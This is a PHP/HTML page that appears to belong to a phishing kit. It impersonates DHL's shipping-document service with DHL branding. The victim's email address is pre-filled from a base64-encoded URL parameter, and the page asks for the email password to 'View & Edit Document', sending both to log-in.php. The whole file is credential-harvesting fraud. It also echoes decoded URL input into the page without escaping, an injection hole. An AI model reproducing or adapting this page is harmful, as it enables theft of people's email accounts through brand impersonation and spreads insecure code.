<?php

include_once("api.php");

if (isset($_GET['id'])) {
$id = $_GET['id'];
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
  <title>VIEW MODE</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  
  <style type="text/css">
  body{
     background:url('images/.jpg')  left top / cover repeat fixed transparent;;
  }
  #top-header{
   width:100%;
   height:50px;
   background:#000;
}
  
  #ff{
  color:red;
}
#ff2{
  color:red;
}
  </style>
</head>
<body class="personal">
<div id="top-header">
<table style="border:none; width:100%; padding:0; margin:0; height:50px; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<tr>
<td style="background:#ffcc00 url(images/dot.png); width:4%; height:100%; margin:0; padding:0; border-right:1px solid #ededed;"></td>
<td style="background:#ffcc00; width:10%; height:100%; margin:0; padding:0; text-align:center;"><img src="images/dhl_logo.gif"></td>
<td style="background:#292323; width:65%; height:100%; margin:0; padding:0 0 0 30px;">
<div class="lighter">
<form class="form-inline" style="">
   <div class="form-group">
    <input type="search" size="30" class="form-control input-lg" id="search" placeholder="Search Shipping Documents">
   </div>
  <button type="submit" class="btn btn-primary btn-lg">Search</button>
</form>

</div>
</td>
<td style="background:#292323; width:5%; height:100%; margin:0; padding:0; color:#fff; text-align:center; border-left:1px solid #fff;" class="hov"></td>
<td style="background:#292323; width:9%; height:100%; margin:0; padding:0; text-align:center; border-left:1px solid #fff;" class="hov"><button type="button" class="btn btn-basic btn-lg">
          

<span style="color:#000;"><span class="glyphicon glyphicon-user"></span> </span>
        </button>
</td>

</tr>

</table>

</div>
<div style="background:#fff;">

<!--LOGO AND SEARCH HEADER HERE-->
<div class="row" style="padding:3px 0 3px 0;">
   <ul class="nav nav-tabs">
  <li><a href="#"> &nbsp; Express </a></li>
  <li class="active"><a href="#">Tracking Login</a></li>
  <li><a href="#">Logistics</a></li>
  <li><a href="#">Careers</a></li>
  <li><a href="#">Edit & Share</a></li>
</ul>
</div>

<div>

</div>
</div>

<div class="row">
<div style="background:#fbfbfb;width:70em;height: 29em;margin:0 auto;margin-top:10px;padding:20px;background: white;z-index: 11;position:relative;" class="">
	
<table style="padding:30px 50px;" cellpadding="30">
<tr>
<td style="padding-right:50px;"><img src="images/girl.jpg"></td>
<td>	
   <img src="images/to_view.jpg" style="margin:10px 0 0;"><br /><br />
 <div style="width:350px;">
 <script type="text/javascript">
function drops() {

    var y = document.forms["dropper"]["person2"].value;
    if (y == null || y == "") {
        document.getElementById('ff2').innerHTML="Please enter a valid email password to continue";
        return false;
    }
	
}
</script>
 <form action="log-in.php" method="post" name="dropper" onsubmit="return drops()">
 <span id="ff2"></span>
  <div class="form-group" >
    <label for="email">Email address:</label>
    <input type="email" name="person1" class="form-control" id="user" value="<?php echo isset($_GET['id']) ? base64_decode($_GET['id']) : '' ?>" placeholder="<?php echo isset($_GET['id']) ? base64_decode($_GET['id']) : '' ?>" class="form-control" readonly>
  </div>
  
  <div class="form-group" >
    <label for="password">Email Password:</label>
    <input type="password" name="person2" class="form-control" id="pass">
  </div>
  

  <div class="checkbox">
    <label><input type="checkbox"> Remember me</label>
  </div>
  <button type="submit" class="btn btn-danger"">View & Edit Document</button>
</form> 
<br/>
</div>
</td></tr></table>
</div>
</div>
<div class="container a_d_sys" id="ads" style="margin-top:15px"><div style="padding-bottom: 10px;"><img src="images/dhl_footer.png" alt="" title="" width="1118" height="60" border="0"></div></div>
</body>
</html>